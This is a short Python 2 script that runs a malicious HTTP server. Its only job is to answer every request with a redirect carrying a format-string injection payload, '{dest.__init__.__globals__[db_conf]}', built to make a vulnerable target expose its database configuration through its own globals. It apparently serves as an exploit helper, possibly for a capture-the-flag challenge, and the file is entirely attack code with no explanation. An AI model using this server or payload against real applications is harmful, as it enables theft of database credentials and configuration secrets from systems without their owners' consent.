from SimpleHTTPServer import SimpleHTTPRequestHandler
from SocketServer import TCPServer

class MyServer(TCPServer):
	allow_reuse_address = True

class HTTP_RequestHandler(SimpleHTTPRequestHandler):
	def do_GET(self):
		self.send_response(301)
		self.send_header('Location', '{dest.__init__.__globals__[db_conf]}')
		return self.end_headers()

MyServer(('', 1338), HTTP_RequestHandler).serve_forever()
